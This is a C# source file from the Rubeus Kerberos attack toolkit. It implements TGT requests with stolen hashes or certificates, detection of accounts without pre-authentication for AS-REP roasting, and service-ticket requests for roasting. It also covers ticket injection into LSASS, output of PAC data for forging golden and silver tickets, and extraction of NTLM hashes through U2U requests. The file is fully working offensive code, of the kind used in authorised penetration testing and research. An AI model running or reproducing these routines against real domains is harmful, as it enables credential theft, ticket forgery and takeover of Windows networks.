b'\xef\xbb\xbfusing System;\nusing System.IO;\nusing System.Security.Cryptography.X509Certificates;\nusing System.Linq;\nusing Asn1;\nusing Rubeus.lib.Interop;\nusing Rubeus.Asn1;\nusing Rubeus.Kerberos;\nusing Rubeus.Kerberos.PAC;\n\n\nnamespace Rubeus {\n\n    public class RubeusException : Exception\n    {\n        public RubeusException(string message)\n            : base(message)\n        {\n        }\n    }\n\n    public class KerberosErrorException : RubeusException\n    {\n        public KRB_ERROR krbError;\n\n        public KerberosErrorException(string message, KRB_ERROR krbError)\n            : base(message)\n        {\n            this.krbError = krbError;\n        }\n    }\n\n    public class Ask\n    {\n        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false, string servicekey = "", bool changepw = false, bool pac = true)\n        {\n            // send request without Pre-Auth to emulate genuine traffic\n            bool preauth = false;\n            if (opsec)\n            {\n                preauth = NoPreAuthTGT(userName, domain, keyString, etype, domainController, outfile, ptt, luid, describe, true);\n            }\n\n            try\n            {\n                // if AS-REQ without pre-auth worked don\'t bother sending AS-REQ with pre-auth\n                if (!preauth)\n                {\n                    //Console.WriteLine("[*] Using {0} hash: {1}", etype, keyString);               \n                    //Console.WriteLine("[*] Building AS-REQ (w/ preauth) for: \'{0}\\\\{1}\'", domain, userName);\n                    AS_REQ userHashASREQ = AS_REQ.NewASReq(userName, domain, keyString, etype, opsec, changepw, pac);\n                    return InnerTGT(userHashASREQ, etype, outfile, ptt, domainController, luid, describe, false, opsec, servicekey);\n                }\n            }\n            catch (KerberosErrorException ex)\n            {\n                KRB_ERROR error = ex.krbError;\n                Console.WriteLine("\\r\\n[X] KRB-ERROR ({0}) : {1}\\r\\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);\n            }\n            catch (RubeusException ex)\n            {\n                Console.WriteLine("\\r\\n" + ex.Message + "\\r\\n");\n            }\n\n            return null;\n        }\n\n        public static bool NoPreAuthTGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string domainController, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false)\n        {\n            string dcIP = Networking.GetDCIP(domainController, true, domain);\n            if (String.IsNullOrEmpty(dcIP)) { return false; }\n\n            AS_REQ NoPreAuthASREQ = AS_REQ.NewASReq(userName, domain, etype, true);\n            byte[] reqBytes = NoPreAuthASREQ.Encode().Encode();\n\n            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);\n\n            if (response == null)\n            {\n                return false;\n            }\n\n            // decode the supplied bytes to an AsnElt object\n            AsnElt responseAsn = AsnElt.Decode(response);\n\n            // check the response value\n            int responseTag = responseAsn.TagValue;\n\n            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)\n            {\n                Console.WriteLine("[-] AS-REQ w/o preauth successful! {0} has pre-authentication disabled!", userName);\n\n                byte[] kirbiBytes = HandleASREP(responseAsn, etype, keyString, outfile, ptt, luid, describe, verbose);\n\n                return true;\n            }\n\n            return false;\n\n        }\n\n        //CCob (@_EthicalChaos_):\n        // Based on KerberosAsymmetricCredential::Get function from Kerberos.NET from here:\n        // https://github.com/dotnet/Kerberos.NET/blob/v4.5.0/Kerberos.NET/Credentials/KerberosAsymmetricCredential.cs\n        // Additional functionality - If the certificate points to a file we assume PKCS12 certificate store \n        // with private key otherwise use users certificate store along with any smartcard that maybe present.\n        public static X509Certificate2 FindCertificate(string certificate, string storePassword) {\n\n            if (File.Exists(certificate)) {\n                return new X509Certificate2(certificate, storePassword);\n            } else {\n\n                X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser);\n                store.Open(OpenFlags.ReadOnly);\n                X509Certificate2 result = null;\n\n                foreach (var cert in store.Certificates) {\n                    if (string.Equals(certificate, cert.Subject, StringComparison.InvariantCultureIgnoreCase)) {\n                        result = cert;\n                        break;\n                    } else if (string.Equals(certificate, cert.Thumbprint, StringComparison.InvariantCultureIgnoreCase)) {\n                        result = cert;\n                        break;\n                    }\n                }\n\n                if (result != null && !String.IsNullOrEmpty(storePassword)) {\n                    result.SetPinForPrivateKey(storePassword);\n                }\n\n                return result;\n            }\n        }\n\n        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false, string servicekey = "", bool getCredentials = false) {\n            try {\n                X509Certificate2 cert = FindCertificate(certFile, certPass);\n\n                // Check for Base64 encoded certificate second in case certFile was a hex-encoded fingerprint\n                if (cert == null && Helpers.IsBase64String(certFile))\n                {\n                    cert = new X509Certificate2(Convert.FromBase64String(certFile), certPass);\n                }\n\n                if (cert == null) {\n                    Console.WriteLine("[!] Failed to find certificate for {0}", certFile);\n                    return null;\n                }\n\n                KDCKeyAgreement agreement = new KDCKeyAgreement();\n\n                Console.WriteLine("[*] Using PKINIT with etype {0} and subject: {1} ", etype, cert.Subject);\n                Console.WriteLine("[*] Building AS-REQ (w/ PKINIT preauth) for: \'{0}\\\\{1}\'", domain, userName);\n\n                AS_REQ pkinitASREQ = AS_REQ.NewASReq(userName, domain, cert, agreement, etype, verifyCerts);\n                return InnerTGT(pkinitASREQ, etype, outfile, ptt, domainController, luid, describe, true, false, servicekey, getCredentials);\n\n            } catch (KerberosErrorException ex) {\n                KRB_ERROR error = ex.krbError;\n                Console.WriteLine("\\r\\n[X] KRB-ERROR ({0}) : {1}\\r\\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);\n            } catch (RubeusException ex) {\n                Console.WriteLine("\\r\\n" + ex.Message + "\\r\\n");\n            }\n\n            return null;\n        }\n\n        public static bool GetPKInitRequest(AS_REQ asReq, out PA_PK_AS_REQ pkAsReq) {\n\n            if (asReq.padata != null) {\n                foreach (PA_DATA paData in asReq.padata) {\n                    if (paData.type == Interop.PADATA_TYPE.PK_AS_REQ) {\n                        pkAsReq = (PA_PK_AS_REQ)paData.value;\n                        return true;\n                    }\n                }\n            }\n            pkAsReq = null;\n            return false;\n        }\n\n        public static int GetKeySize(Interop.KERB_ETYPE etype) {           \n            switch (etype) {\n                 case Interop.KERB_ETYPE.des_cbc_md5:\n                    return 7;\n                case Interop.KERB_ETYPE.rc4_hmac:\n                    return 16;\n                case Interop.KERB_ETYPE.aes128_cts_hmac_sha1:\n                    return 16;\n                case Interop.KERB_ETYPE.aes256_cts_hmac_sha1:\n                    return 32;\n                default:\n                    throw new ArgumentException("Only /des, /rc4, /aes128, and /aes256 are supported at this time");\n            }\n        }\n\n        public static byte[] InnerTGT(AS_REQ asReq, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false, bool opsec = false, string serviceKey = "", bool getCredentials = false)\n        {\n            if ((ulong)luid != 0) {\n                Console.WriteLine("[*] Target LUID : {0}", (ulong)luid);\n            }\n\n            string dcIP = Networking.GetDCIP(domainController, false);\n            if (String.IsNullOrEmpty(dcIP))\n            {\n                throw new RubeusException("[X] Unable to get domain controller address");\n            }\n\n            byte[] response = Networking.SendBytes(dcIP, 88, asReq.Encode().Encode());\n            if (response == null)\n            {\n                throw new RubeusException("[X] No answer from domain controller");\n            }\n\n            // decode the supplied bytes to an AsnElt object\n            AsnElt responseAsn;\n            try\n            {\n                responseAsn = AsnElt.Decode(response);\n            }\n            catch(Exception e)\n            {\n               throw new Exception($"Error parsing response AS-REQ: {e}.  Base64 response: {Convert.ToBase64String(response)}");\n            }\n\n            // check the response value\n            int responseTag = responseAsn.TagValue;\n\n            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)\n            {\n                if (verbose)\n                {\n                    Console.WriteLine("[+] TGT request successful!");\n                }\n\n                byte[] kirbiBytes = HandleASREP(responseAsn, etype, asReq.keyString, outfile, ptt, luid, describe, verbose, asReq, serviceKey, getCredentials, dcIP);\n\n                return kirbiBytes;\n            }\n            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)\n            {\n                // parse the response to an KRB-ERROR\n                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);\n                throw new KerberosErrorException("", error);\n            }\n            else\n            {\n                throw new RubeusException("[X] Unknown application tag: " + responseTag);\n            }\n        }\n\n        public static void TGS(KRB_CRED kirbi, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false)\n        {\n            // kirbi            = the TGT .kirbi to use for ticket requests\n            // service          = the SPN being requested\n            // requestEType     = specific encryption type for the request, Interop.KERB_ETYPE.subkey_keymaterial implies default\n            // ptt              = "pass-the-ticket" so apply the ticket to the current logon session\n            // domainController = the specific domain controller to send the request, defaults to the system\'s DC\n            // display          = true to display the ticket\n\n            // extract out the info needed for the TGS-REQ request\n            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];\n            string domain = kirbi.enc_part.ticket_info[0].prealm;\n            Ticket ticket = kirbi.tickets[0];\n            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;\n\n            // the etype for the PA Data for the request, so needs to match the TGT key type\n            Interop.KERB_ETYPE paEType = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;\n\n            string[] services = service.Split(\',\');\n            foreach (string sname in services)\n            {\n                // request the new service ticket\n                TGS(userName, domain, ticket, clientKey, paEType, sname, requestEType, outfile, ptt, domainController, display, enterprise, roast, opsec, tgs, targetDomain, servicekey, asrepkey, u2u, targetUser, printargs);\n                Console.WriteLine();\n            }\n        }\n\n        public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE paEType, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false)\n        {\n            string dcIP = Networking.GetDCIP(domainController, display);\n            if (String.IsNullOrEmpty(dcIP)) { return null; }\n\n            if (display)\n            {\n                if (requestEType == Interop.KERB_ETYPE.subkey_keymaterial)\n                {\n                    Console.WriteLine("[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket", requestEType);\n                }\n                else\n                {\n                    Console.WriteLine("[*] Requesting \'{0}\' etype for the service ticket", requestEType);\n                }\n\n                if (!String.IsNullOrEmpty(service))\n                    Console.WriteLine("[*] Building TGS-REQ request for: \'{0}\'", service);\n                else if (u2u)\n                    Console.WriteLine("[*] Building User-to-User TGS-REQ request for: \'{0}\'", userName);\n                else\n                    Console.WriteLine("[*] Building TGS-REQ request");\n\n            }\n\n            // if /service is empty get name from the supplied /tgs\n            if (u2u && tgs != null && String.IsNullOrEmpty(service))\n                service = tgs.enc_part.ticket_info[0].pname.name_string[0];\n\n            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, paEType, requestEType, false, targetUser, enterprise, roast, opsec, false, tgs, targetDomain, u2u);\n\n            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);\n            if (response == null)\n            {\n                return null;\n            }\n\n            // decode the supplied bytes to an AsnElt object\n            //  false == ignore trailing garbage\n            AsnElt responseAsn = AsnElt.Decode(response);\n\n            // check the response value\n            int responseTag = responseAsn.TagValue;\n\n            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)\n            {\n                if (display)\n                {\n                    Console.WriteLine("[+] TGS request successful!");\n                }\n\n                // parse the response to an TGS-REP\n                TGS_REP rep = new TGS_REP(responseAsn);\n\n                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8\n                byte[] outBytes = Crypto.KerberosDecrypt(paEType, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);\n                AsnElt ae = AsnElt.Decode(outBytes);\n                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);\n\n                // if using /opsec and the ticket is for a server configuration for unconstrained delegation, request a forwardable TGT\n                if (opsec && (!roast) && ((encRepPart.flags & Interop.TicketFlags.ok_as_delegate) != 0))\n                {\n                    byte[] tgtBytes = TGS_REQ.NewTGSReq(userName, domain, string.Format("krbtgt/{0}", domain), providedTicket, clientKey, paEType, requestEType, false, "", enterprise, roast, opsec, true);\n\n                    byte[] tgtResponse = Networking.SendBytes(dcIP, 88, tgtBytes);\n                }\n\n                // now build the final KRB-CRED structure\n                KRB_CRED cred = new KRB_CRED();\n\n                // add the ticket\n                cred.tickets.Add(rep.ticket);\n\n                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart\n\n                KrbCredInfo info = new KrbCredInfo();\n\n                // [0] add in the session key\n                info.key.keytype = encRepPart.key.keytype;\n                info.key.keyvalue = encRepPart.key.keyvalue;\n\n                // [1] prealm (domain)\n                info.prealm = rep.crealm;\n\n                // [2] pname (user)\n                info.pname.name_type = rep.cname.name_type;\n                info.pname.name_string = rep.cname.name_string;\n\n                // [3] flags\n                info.flags = encRepPart.flags;\n\n                // [4] authtime (not required)\n\n                // [5] starttime\n                info.starttime = encRepPart.starttime;\n\n                // [6] endtime\n                info.endtime = encRepPart.endtime;\n\n                // [7] renew-till\n                info.renew_till = encRepPart.renew_till;\n\n                // [8] srealm\n                info.srealm = encRepPart.realm;\n\n                // [9] sname\n                info.sname.name_type = encRepPart.sname.name_type;\n                info.sname.name_string = encRepPart.sname.name_string;\n\n                // add the ticket_info into the cred object\n                cred.enc_part.ticket_info.Add(info);\n\n                byte[] kirbiBytes = cred.Encode().Encode();\n\n                string kirbiString = Convert.ToBase64String(kirbiBytes);\n\n                if (ptt)\n                {\n                    // pass-the-ticket -> import into LSASS\n                    LSA.ImportTicket(kirbiBytes, new LUID());\n                }\n\n                if (String.IsNullOrEmpty(servicekey) && u2u)\n                    servicekey = Helpers.ByteArrayToString(clientKey);\n\n                if (display)\n                {\n                    Console.WriteLine("[*] base64(ticket.kirbi):\\r\\n", kirbiString);\n\n                    if (false)\n                    {\n                        // display the .kirbi base64, columns of 80 chararacters\n                        foreach (string line in Helpers.Split(kirbiString, 80))\n                        {\n                            Console.WriteLine("      {0}", line);\n                        }\n                    }\n                    else\n                    {\n                        Console.WriteLine("      {0}", kirbiString);\n                    }\n\n                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);\n\n                    LSA.DisplayTicket(kirbi, 2, false, false, false, false, \n                        string.IsNullOrEmpty(servicekey) ? null : Helpers.StringToByteArray(servicekey), string.IsNullOrEmpty(asrepkey) ? null : Helpers.StringToByteArray(asrepkey));\n                }\n\n                if (!String.IsNullOrEmpty(outfile))\n                {\n                    outfile = Helpers.MakeValidFileName(outfile);\n                    if (Helpers.WriteBytesToFile(outfile, kirbiBytes))\n                    {\n                        if (display)\n                        {\n                            Console.WriteLine("\\r\\n[*] Ticket written to {0}\\r\\n", outfile);\n                        }\n                    }\n                }\n\n                if (!String.IsNullOrEmpty(servicekey) && printargs)\n                {\n                    var decryptedEncTicket = cred.tickets[0].Decrypt(Helpers.StringToByteArray(servicekey), null);\n                    PACTYPE pt = decryptedEncTicket.GetPac(null);\n                    if (pt == null)\n                    {\n                        Console.WriteLine("[X] Unable to get the PAC");\n                        return kirbiBytes;\n                    }\n\n                    string outArgs = String.Empty;\n\n                    foreach (var pacInfoBuffer in pt.PacInfoBuffers)\n                    {\n                        if (pacInfoBuffer is LogonInfo li)\n                        {\n                            outArgs = String.Format("/user:{0} /id:{1} /pgid:{2} /logoncount:{3} /badpwdcount:{4} /sid:{5} /netbios:{6}", li.KerbValidationInfo.EffectiveName, li.KerbValidationInfo.UserId, li.KerbValidationInfo.PrimaryGroupId, li.KerbValidationInfo.LogonCount, li.KerbValidationInfo.BadPasswordCount, li.KerbValidationInfo.LogonDomainId.GetValue(), li.KerbValidationInfo.LogonDomainName);\n                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.FullName.ToString()))\n                                outArgs = String.Format("{0} /displayname:\\"{1}\\"", outArgs, li.KerbValidationInfo.FullName);\n                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.LogonScript.ToString()))\n                                outArgs = String.Format("{0} /scriptpath:\\"{1}\\"", outArgs, li.KerbValidationInfo.LogonScript);\n                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.ProfilePath.ToString()))\n                                outArgs = String.Format("{0} /profilepath:\\"{1}\\"", outArgs, li.KerbValidationInfo.ProfilePath);\n                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.HomeDirectory.ToString()))\n                                outArgs = String.Format("{0} /homedir:\\"{1}\\"", outArgs, li.KerbValidationInfo.HomeDirectory);\n                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.HomeDirectoryDrive.ToString()))\n                                outArgs = String.Format("{0} /homedrive:\\"{1}\\"", outArgs, li.KerbValidationInfo.HomeDirectoryDrive);\n                            if (li.KerbValidationInfo.GroupCount > 0)\n                                outArgs = String.Format("{0} /groups:{1}", outArgs, li.KerbValidationInfo.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));\n                            if (li.KerbValidationInfo.SidCount > 0)\n                                outArgs = String.Format("{0} /sids:{1}", outArgs, li.KerbValidationInfo.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));\n                            if (li.KerbValidationInfo.ResourceGroupCount > 0)\n                                outArgs = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", outArgs, li.KerbValidationInfo.ResourceGroupDomainSid.GetValue().ToString(), li.KerbValidationInfo.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));\n                            try\n                            {\n                                outArgs = String.Format("{0} /logofftime:\\"{1}\\"", outArgs, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.LogoffTime.LowDateTime | ((long)li.KerbValidationInfo.LogoffTime.HighDateTime << 32)).ToLocalTime());\n                            }\n                            catch { }\n                            DateTime? passLastSet = null;\n                            try\n                            {\n                                passLastSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordLastSet.LowDateTime | ((long)li.KerbValidationInfo.PasswordLastSet.HighDateTime << 32));\n                            }\n                            catch { }\n                            if (passLastSet != null)\n                            {\n                                outArgs = String.Format("{0} /pwdlastset:\\"{1}\\"", outArgs, ((DateTime)passLastSet).ToLocalTime());\n                                DateTime? passCanSet = null;\n                                try\n                                {\n                                    passCanSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordCanChange.LowDateTime | ((long)li.KerbValidationInfo.PasswordCanChange.HighDateTime << 32));\n                                }\n                                catch { }\n                                if (passCanSet != null)\n                                    outArgs = String.Format("{0} /minpassage:{1}d", outArgs, (((DateTime)passCanSet) - ((DateTime)passLastSet)).Days);\n                                DateTime? passMustSet = null;\n                                try\n                                {\n                                    passCanSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordMustChange.LowDateTime | ((long)li.KerbValidationInfo.PasswordMustChange.HighDateTime << 32));\n                                }\n                                catch { }\n                                if (passMustSet != null)\n                                    outArgs = String.Format("{0} /maxpassage:{1}d", outArgs, (((DateTime)passMustSet) - ((DateTime)passLastSet)).Days);\n                            }\n                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.LogonServer.ToString()))\n                                outArgs = String.Format("{0} /dc:{1}.{2}", outArgs, li.KerbValidationInfo.LogonServer.ToString(), cred.tickets[0].realm);\n                            if ((Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl != Interop.PacUserAccountControl.NORMAL_ACCOUNT)\n                                outArgs = String.Format("{0} /uac:{1}", outArgs, String.Format("{0}", (Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl).Replace(" ", ""));\n                        }\n                    }\n\n                    Console.WriteLine("\\r\\n[*] Printing argument list for use with Rubeus\' \'golden\' or \'silver\' commands:\\r\\n\\r\\n{0}\\r\\n", outArgs);\n                }\n\n                return kirbiBytes;\n            }\n            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)\n            {\n                // parse the response to an KRB-ERROR\n                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);\n                Console.WriteLine("\\r\\n[X] KRB-ERROR ({0}) : {1}\\r\\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);\n            }\n            else\n            {\n                Console.WriteLine("\\r\\n[X] Unknown application tag: {0}", responseTag);\n            }\n            return null;\n        }\n\n        private static byte[] HandleASREP(AsnElt responseAsn, Interop.KERB_ETYPE etype, string keyString, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, AS_REQ asReq = null, string serviceKey = "", bool getCredentials = false, string dcIP = "")\n        {\n            // parse the response to an AS-REP\n            AS_REP rep = new AS_REP(responseAsn);\n\n            // convert the key string to bytes\n            byte[] key;\n            if (GetPKInitRequest(asReq, out PA_PK_AS_REQ pkAsReq)) {      \n                // generate the decryption key using Diffie Hellman shared secret \n                PA_PK_AS_REP pkAsRep = (PA_PK_AS_REP)rep.padata[0].value;                    \n                key = pkAsReq.Agreement.GenerateKey(pkAsRep.DHRepInfo.KDCDHKeyInfo.SubjectPublicKey.DepadLeft(), new byte[0], \n                    pkAsRep.DHRepInfo.ServerDHNonce, GetKeySize(etype));\n            } else {\n                // convert the key string to bytes\n                key = Helpers.StringToByteArray(asReq.keyString);\n            }\n\n            // decrypt the enc_part containing the session key/etc.\n            // TODO: error checking on the decryption "failing"...\n            byte[] outBytes;\n\n            if (etype == Interop.KERB_ETYPE.des_cbc_md5)\n            {\n                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8\n                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);\n            }\n            else if (etype == Interop.KERB_ETYPE.rc4_hmac)\n            {\n                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8\n                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);\n            }\n            else if (etype == Interop.KERB_ETYPE.aes128_cts_hmac_sha1)\n            {\n                // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3\n                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);\n            }\n            else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)\n            {\n                // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3\n                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);\n            }\n            else\n            {\n                throw new RubeusException("[X] Encryption type \\"" + etype + "\\" not currently supported");\n            }\n\n            AsnElt ae = AsnElt.Decode(outBytes);\n\n            EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);\n\n            // now build the final KRB-CRED structure\n            KRB_CRED cred = new KRB_CRED();\n\n            // add the ticket\n            cred.tickets.Add(rep.ticket);\n\n            // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart\n\n            KrbCredInfo info = new KrbCredInfo();\n\n            // [0] add in the session key\n            info.key.keytype = encRepPart.key.keytype;\n            info.key.keyvalue = encRepPart.key.keyvalue;\n\n            // [1] prealm (domain)\n            info.prealm = encRepPart.realm;\n\n            // [2] pname (user)\n            info.pname.name_type = rep.cname.name_type;\n            info.pname.name_string = rep.cname.name_string;\n\n            // [3] flags\n            info.flags = encRepPart.flags;\n\n            // [4] authtime (not required)\n\n            // [5] starttime\n            info.starttime = encRepPart.starttime;\n\n            // [6] endtime\n            info.endtime = encRepPart.endtime;\n\n            // [7] renew-till\n            info.renew_till = encRepPart.renew_till;\n\n            // [8] srealm\n            info.srealm = encRepPart.realm;\n\n            // [9] sname\n            info.sname.name_type = encRepPart.sname.name_type;\n            info.sname.name_string = encRepPart.sname.name_string;\n\n            // add the ticket_info into the cred object\n            cred.enc_part.ticket_info.Add(info);\n\n            byte[] kirbiBytes = cred.Encode().Encode();\n\n            if (verbose)\n            {\n                string kirbiString = Convert.ToBase64String(kirbiBytes);\n\n                Console.WriteLine("[*] base64(ticket.kirbi):\\r\\n", kirbiString);\n\n                if (false)\n                {\n                    // display the .kirbi base64, columns of 80 chararacters\n                    foreach (string line in Helpers.Split(kirbiString, 80))\n                    {\n                        Console.WriteLine("      {0}", line);\n                    }\n                }\n                else\n                {\n                    Console.WriteLine("      {0}", kirbiString);\n                }\n            }\n\n            if (!String.IsNullOrEmpty(outfile))\n            {\n                outfile = Helpers.MakeValidFileName(outfile);\n                if (Helpers.WriteBytesToFile(outfile, kirbiBytes))\n                {\n                    if (verbose)\n                    {\n                        Console.WriteLine("\\r\\n[*] Ticket written to {0}\\r\\n", outfile);\n                    }\n                }\n            }\n\n            if (ptt || ((ulong)luid != 0))\n            {\n                // pass-the-ticket -> import into LSASS\n                LSA.ImportTicket(kirbiBytes, luid);\n            }\n\n            if (describe)\n            {\n                KRB_CRED kirbi = new KRB_CRED(kirbiBytes);\n                LSA.DisplayTicket(kirbi, 2, false, false, false, false, string.IsNullOrEmpty(serviceKey) ? null : Helpers.StringToByteArray(serviceKey), key);\n            }\n\n            if (getCredentials)\n            {\n                Console.WriteLine("[*] Getting credentials using U2U\\r\\n");\n                byte[] u2uBytes = TGS_REQ.NewTGSReq(info.pname.name_string[0], info.prealm, info.pname.name_string[0], cred.tickets[0], info.key.keyvalue, (Interop.KERB_ETYPE)info.key.keytype, Interop.KERB_ETYPE.subkey_keymaterial, false, String.Empty, false, false, false, false, cred, "", true);\n                byte[] u2uResponse = Networking.SendBytes(dcIP, 88, u2uBytes);\n                if (u2uResponse == null)\n                {\n                    return null;\n                }\n                AsnElt u2uResponseAsn = AsnElt.Decode(u2uResponse);\n\n                // check the response value\n                int responseTag = u2uResponseAsn.TagValue;\n\n                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)\n                {\n                    // parse the response to an TGS-REP and get the PAC\n                    TGS_REP u2uRep = new TGS_REP(u2uResponseAsn);\n                    EncTicketPart u2uEncTicketPart = u2uRep.ticket.Decrypt(info.key.keyvalue, key);\n                    PACTYPE pt = u2uEncTicketPart.GetPac(key);\n\n                    // look for the credential information and print\n                    foreach (var pacInfoBuffer in pt.PacInfoBuffers)\n                    {\n                        if (pacInfoBuffer is PacCredentialInfo ci)\n                        {\n\n                            Console.WriteLine("  CredentialInfo         :");\n                            Console.WriteLine("    Version              : {0}", ci.Version);\n                            Console.WriteLine("    EncryptionType       : {0}", ci.EncryptionType);\n\n                            if (ci.CredentialInfo.HasValue)\n                            {\n\n                                Console.WriteLine("    CredentialData       :");\n                                Console.WriteLine("      CredentialCount    : {0}", ci.CredentialInfo.Value.CredentialCount);\n\n                                foreach (var credData in ci.CredentialInfo.Value.Credentials)\n                                {\n                                    string hash = "";\n                                    if ("NTLM".Equals(credData.PackageName.ToString()))\n                                    {\n                                        int version = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 0);\n                                        int flags = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 4);\n                                        if (flags == 3)\n                                        {\n                                            hash = String.Format("{0}:{1}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(8).Take(16).ToArray()), Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));\n                                        }\n                                        else\n                                        {\n                                            hash = String.Format("{0}", Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray()));\n                                        }\n                                    }\n                                    else\n                                    {\n                                        hash = Helpers.ByteArrayToString((byte[])(Array)credData.Credentials);\n                                    }\n\n                                    Console.WriteLine("       {0}              : {1}", credData.PackageName, hash);\n                                }\n\n                            }\n                            else\n                            {\n                                Console.WriteLine("    CredentialData    :   *** NO KEY ***");\n                            }\n                        }\n                    }\n                }\n                else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)\n                {\n                    // parse the response to an KRB-ERROR\n                    KRB_ERROR error = new KRB_ERROR(u2uResponseAsn.Sub[0]);\n                    Console.WriteLine("\\r\\n[X] KRB-ERROR ({0}) : {1}\\r\\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);\n                }\n                else\n                {\n                    Console.WriteLine("\\r\\n[X] Unknown application tag: {0}", responseTag);\n                }\n            }\n\n            return kirbiBytes;\n        }\n    }\n}\n'